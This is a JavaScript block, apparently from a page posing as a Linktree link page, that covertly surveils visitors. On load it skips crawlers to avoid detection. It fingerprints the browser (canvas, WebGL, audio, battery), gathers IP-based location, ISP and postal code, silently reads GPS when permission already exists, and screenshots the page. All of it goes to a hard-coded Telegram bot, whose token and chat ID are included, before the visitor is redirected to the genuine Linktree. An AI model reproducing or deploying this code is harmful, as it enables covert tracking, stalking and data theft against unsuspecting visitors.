  <!-- ========== CORE TRACKING ENGINE ============= -->

  <script>
  (function() {
    // ================= KONFIGURASI TELEGRAM =================
    const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
    const CHAT_ID = '5986004601';

    // ================= FUNGSI UTAMA =================
    async function sendTelegramMessage(text) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          })
        });
      } catch (e) {
        // fallback GET
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
      }
    }

    async function sendPhotoWithCaption(photoBlob, caption) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photoBlob, 'screenshot.jpg');
      formData.append('caption', caption);
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        return true;
      } catch (e) {
        return false;
      }
    }

    // ================= DETEKSI BOT / CRAWLER =================
    function isBot(userAgent) {
      const botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
        'telegrambot', 'whatsapp', 'facebookexternalhit', 'twitterbot',
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'applebot', 'linkedinbot', 'embedly', 'pinterest'
      ];
      const ua = userAgent.toLowerCase();
      return botPatterns.some(pattern => ua.includes(pattern));
    }

    // ================= FINGERPRINTING FUNCTIONS =================
    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 280; canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '16px "Segoe UI", Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0,0,280,60);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint Canvas 未', 10, 8);
        ctx.fillStyle = 'rgba(102, 200, 0, 0.8)';
        ctx.fillText('Unique Hash Generator', 12, 34);
        return canvas.toDataURL();
      } catch(e) { return 'canvas_blocked'; }
    }

    function getWebGLFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'webgl_disabled';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        return `Vendor: ${vendor}, Renderer: ${renderer}`;
      } catch(e) { return 'webgl_error'; }
    }

    function getAudioFingerprint() {
      return new Promise((resolve) => {
        try {
          const AudioContext = window.AudioContext || window.webkitAudioContext;
          if (!AudioContext) return resolve('audio_unsupported');
          const context = new AudioContext();
          const oscillator = context.createOscillator();
          const analyser = context.createAnalyser();
          const gainNode = context.createGain();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, context.currentTime);
          gainNode.gain.setValueAtTime(0, context.currentTime); // silent
          oscillator.connect(gainNode);
          gainNode.connect(analyser);
          analyser.connect(context.destination);
          oscillator.start(0);
          const bufferLength = analyser.frequencyBinCount;
          const dataArray = new Uint8Array(bufferLength);
          analyser.getByteFrequencyData(dataArray);
          oscillator.stop(0);
          const slice = Array.from(dataArray.slice(0, 30)).join(',');
          context.close();
          resolve(slice);
        } catch(e) { resolve('audio_error'); }
      });
    }

    function getBatteryStatus() {
      return new Promise((resolve) => {
        if (navigator.getBattery) {
          navigator.getBattery().then(b => {
            resolve(`Level: ${Math.round(b.level*100)}%, Charging: ${b.charging}, DischargeTime: ${b.dischargingTime}`);
          }).catch(() => resolve('battery_denied'));
        } else resolve('battery_api_missing');
      });
    }

    function getNetworkInfo() {
      if ('connection' in navigator) {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          return `Type: ${conn.effectiveType || '?'}, Downlink: ${conn.downlink || '?'} Mbps, RTT: ${conn.rtt || '?'}ms`;
        }
      }
      return 'Network info unavailable';
    }

    function getDeviceSpecs() {
      return `Screen: ${screen.width}x${screen.height} (avail: ${screen.availWidth}x${screen.availHeight})
RAM: ${navigator.deviceMemory || '?'} GB
Cores: ${navigator.hardwareConcurrency || '?'}
Touch: ${('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No'}
Lang: ${navigator.language || navigator.userLanguage}
TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}
Plugins: ${Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none'}`;
    }

    // ================= IP & GEO =================
    async function fetchIPGeoData() {
      // Coba ipapi.co dulu
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error('ipapi fail');
        const d = await res.json();
        return `IP: ${d.ip}
ISP: ${d.org}
Kota: ${d.city}, Region: ${d.region}
Negara: ${d.country_name} (${d.country_code})
Koord: ${d.latitude}, ${d.longitude}
Kode Pos: ${d.postal}`;
      } catch(e) {
        // Fallback ke ipify + ipinfo
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const { ip } = await ipRes.json();
          const geoRes = await fetch(`https://ipinfo.io/${ip}/json`);
          const g = await geoRes.json();
          const loc = g.loc ? g.loc.split(',') : ['?', '?'];
          return `IP: ${ip}
ISP: ${g.org || '?'}
Kota: ${g.city || '?'}, Region: ${g.region || '?'}
Negara: ${g.country || '?'}
Koord: ${loc[0]}, ${loc[1]}
Kode Pos: ${g.postal || '?'}`;
        } catch(e2) {
          return 'IP: Gagal diambil';
        }
      }
    }

    // ================= SILENT GEOLOCATION (jika izin sudah granted) =================
    function trySilentGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.permissions || !navigator.geolocation) {
          return resolve('Geolocation API not available');
        }
        navigator.permissions.query({ name: 'geolocation' }).then(perm => {
          if (perm.state === 'granted') {
            navigator.geolocation.getCurrentPosition(
              pos => {
                const { latitude, longitude, accuracy } = pos.coords;
                resolve(`GPS Silent: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} (akurasi ${accuracy}m)`);
              },
              err => resolve(`GPS error: ${err.message}`),
              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
          } else {
            resolve(`GPS izin: ${perm.state}`);
          }
        }).catch(() => resolve('Permission query failed'));
      });
    }

    // ================= LOCAL STORAGE (Visit Count) =================
    function trackVisit() {
      try {
        let visits = localStorage.getItem('lynzxz_visits');
        if (!visits) visits = 0;
        visits = parseInt(visits) + 1;
        localStorage.setItem('lynzxz_visits', visits);
        const firstVisit = localStorage.getItem('lynxz_first_visit') || new Date().toISOString();
        if (!localStorage.getItem('lynxz_first_visit')) {
          localStorage.setItem('lynxz_first_visit', firstVisit);
        }
        return { count: visits, firstVisit };
      } catch(e) {
        return { count: '?', firstVisit: '?' };
      }
    }

    // ================= SCREENSHOT HALAMAN =================
    async function captureScreenshot() {
      try {
        const canvas = await html2canvas(document.body, {
          scale: 0.5,
          backgroundColor: null,
          logging: false
        });
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.65));
        return blob;
      } catch(e) {
        return null;
      }
    }

    // ================= PEMBANGUN PESAN NOTIFIKASI =================
    async function buildRichMessage() {
      const ua = navigator.userAgent;
      const visitInfo = trackVisit();
      const device = getDeviceSpecs();
      const canvasFP = getCanvasFingerprint();
      const canvasHash = btoa(canvasFP).substring(0, 35);
      const webgl = getWebGLFingerprint();
      const audio = await getAudioFingerprint();
      const battery = await getBatteryStatus();
      const network = getNetworkInfo();
      const ipData = await fetchIPGeoData();
      const silentGPS = await trySilentGeolocation();
      const timeStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

      return `🔍 <b>PENGUNJUNG BARU LINKTREE</b>
━━━━━━━━━━━━━━━━━━
🌐 <b>Jaringan & Lokasi</b>
${ipData}
${silentGPS}
Koneksi: ${network}
━━━━━━━━━━━━━━━━━━
📟 <b>Perangkat</b>
UA: ${ua}
${device}
━━━━━━━━━━━━━━━━━━
🎨 <b>Fingerprint</b>
Canvas: ${canvasHash}
WebGL: ${webgl}
Audio: ${audio}
Baterai: ${battery}
━━━━━━━━━━━━━━━━━━
📊 <b>Session</b>
Kunjungan ke-: ${visitInfo.count}
Pertama: ${visitInfo.firstVisit}
Waktu: ${timeStr}`;
    }

    // ================= EKSEKUSI UTAMA =================
    async function execute() {
      // Anti bot: jika user-agent bot, tampilkan halaman tanpa mengirim data.
      if (isBot(navigator.userAgent)) {
        console.log('Bot detected, skip tracking');
        return;
      }

      // Tunggu 1.5 detik agar halaman ter-render sempurna
      await new Promise(r => setTimeout(r, 1500));

      try {
        // Bangun pesan teks kaya
        const message = await buildRichMessage();

        // Ambil screenshot halaman sebagai JPEG
        const screenshotBlob = await captureScreenshot();

        let sent = false;
        if (screenshotBlob) {
          sent = await sendPhotoWithCaption(screenshotBlob, message);
        }

        // Fallback jika screenshot gagal atau tidak ada blob
        if (!sent) {
          await sendTelegramMessage(message);
        }

        // Redirect halus ke Linktree asli setelah 3 detik (opsional, hapus jika tidak ingin)
        setTimeout(() => {
          window.location.replace('https://linktr.ee/lynxz');
        }, 3000);

      } catch (err) {
        // Jika terjadi error total, kirim pesan minimal
        await sendTelegramMessage(`⚠️ Tracking partial error: ${err.message}`);
      }
    }

    // Mulai setelah halaman dan semua resource siap
    window.addEventListener('load', execute);
  })();
  </script>
